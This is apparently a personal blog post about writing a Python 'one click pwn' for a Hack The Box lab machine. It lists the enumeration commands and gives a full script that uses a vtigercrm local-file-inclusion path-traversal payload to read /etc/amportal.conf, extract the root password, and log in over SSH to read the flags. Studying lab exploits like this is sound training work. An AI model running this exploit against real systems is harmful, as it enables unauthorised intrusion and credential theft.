+++
title = 'Automating Htb Bank'
date = 2025-02-21T20:32:04+01:00
+++

# The 'Art' of automation

Because I wanted to get OSCP at some point, I started preparing for it by working through TJNull's OSCP list.  
Currently, as another form of gathering knowledge and skills, I am doing the HTB CPTS.  
It is a lot of fun.  
<br>
I could already program in Python and wanted to see if it is possible to create a 'one click pwn'.  
Or an automated sequence of steps to get to both of the flags.  
For the first exercise, I (ab)used the box *Beep* for it.  

## Skipping of enumeration process

To simplify this undertaking, I did not include the enumeration process.  
But the steps for this box, heavily speed up, are:  
1. nmap scan, `sudo nmap 10.10.10.7 -sC -sV -p- -oN bank.out`
2. visit website, change settings in Firefox about:config and change minimum TLS version to 1. 
3. Directory Busting, `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://10.10.10.7 -r -t 20`
4. Check if vtigercrm has publicly known exploits, `searchsploit vtigercrm`
5. Finding the one that does work,`https://www.exploit-db.com/exploits/37637`
6. Run the LFI to find the root password, connect with SSH for Party Time
7. No Party time yet because SSH complains about not support version of encryption, Using Kali Tweaks -> Hardening -> SSH

## Alright automate it

As a smarter person than me could deduce from the imports, is that we basically need a way to interact with SSH and Websites.  
The TC, termcolor, is a custom terminal colouring library I wrote myself.  
Consider it a poor man's Rich.  

```Python
import ssl
import argparse
import paramiko
import requests
import urllib3
from tc import TC
```
Getting the LFI right was a bit tricky do to requests complaining about the same issues.  
Hence we 'override' the HTTPAdapter class and change it's SSL context and remove some safety settings.

```python
urllib3.disable_warnings()


class HTTPAdapter(requests.adapters.HTTPAdapter):
    """
    This class is needed to change the standard SSL behaviour of Requests.
    It won't except the 'unsafer' versions of SSL / TLS.
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        ssl_context = ssl.create_default_context()
        ssl_context.minimum_version = ssl.TLSVersion.TLSv1
        ssl_context.check_hostname = False
        kwargs["ssl_context"] = ssl_context
        return super().init_poolmanager(*args, **kwargs)
```

After that, we can use the LFI to obtain the Username and Password.  
As we can see, we obtain the amportal.conf, use some regex to find all the passwords.  

```python
def pwn_vtigercrm(ip_address) -> list:
    """
    Takes in the IP Address
    Performs an LFI attack to obtain Password of the root user
    The special bit is in regard to user an requests adapter.
    """
    URL = f"https://{ip_address}/vtigercrm/graph.php?current_language="
    PARAMETER = "../../../../../../../../etc/amportal.conf%00&module=Accounts&action"
    PASSWORDLIST = set()
    with requests.Session() as s:
        s.mount("https://", HTTPAdapter())
        try:
            res = s.get(url=URL+PARAMETER, verify=False)
            print(
                f"{TC.Text.GREEN}[*]{TC.RESET} LFI Attack Done on host: {TC.Text.YELLOW}{ip_address}{TC.RESET}")
            for line in res.text.split('\n'):
                if "PASS" in line and not "#" in line:
                    PASSWORDLIST.add(line.split("=")[1])
        except Exception as e:
            print(f"{TC.Text.RED}[*]{TC.RESET} Something went wrong: {e}")
    print(
        f"{TC.Text.GREEN}[*]{TC.RESET} {len(PASSWORDLIST)} unique passwords found: {TC.Text.YELLOW}{PASSWORDLIST}{TC.RESET}")
    return list(PASSWORDLIST)
```

With Paramiko, we can automate the SSH logging in and sending commands process.  
We use the AutoAddPolicy, which is basically doing the same thing we do when we get the SSH Warning.  
Accept so we can further our hacking endeavours.  


```python
def get_flags(ip_address, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=ip_address, username=username, password=password)

    flag_location = {'user': '/home/fanis/user.txt', 'root': '/root/root.txt'}
    for key, value in flag_location.items():
        print(f"{TC.Text.GREEN}[*]{TC.RESET} Trying to get the {key} flag")
        _, stdout, stderr = client.exec_command(f"cat {value}")
        output = stdout.readlines() + stderr.readlines()
        if output:
            print(f"{TC.Text.GREEN}----Flag----{TC.RESET}")
            for line in output:
                print(
                    f"{TC.Text.GREEN}[>]{TC.RESET} {TC.Text.YELLOW}{line.strip()}{TC.RESET}")
```

The last section is when we run this specific file, we can use it as a command line tool.  
We give it the IP of the box, it runs and we get the flags.

```python
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="Automate BEEP",
        description="Fire and Pown")
    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument(
        "-H", "--host", help="The IP address of Beep", required=True)
    args = parser.parse_args()
    pw = pwn_vtigercrm(args.host)[0]
    get_flags(args.host, 'root', pw)
```

## Lessons learned and next steps

These are some nice tools to have in my toolbox and I am glad that I did it.  
Not all code is clean and neat, but that is the most important lesson.  
Make something you deem fun and worth your time. Learn by applying, and research on how to get better.  

I like to continue with it and do some more boxes this way.  
But next time, I try to automate the enumeration process as well.

XOXO Sp00ky.
